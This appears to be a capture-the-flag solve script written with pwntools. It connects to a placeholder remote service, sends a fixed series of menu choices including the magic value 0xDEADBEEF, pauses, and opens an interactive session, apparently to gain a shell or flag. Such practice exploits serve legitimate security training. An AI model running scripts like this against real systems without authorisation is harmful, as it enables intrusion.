from pwn import *
import time

p = remote('ADDRESS', PORT)
p.sendlineafter("Input: ", b'2')
p.sendlineafter("Input: ", b'1')
p.sendlineafter("Input: ", b'3735928559')

time.sleep(10)
p.sendlineafter("Input: ", b'3')
p.interactive()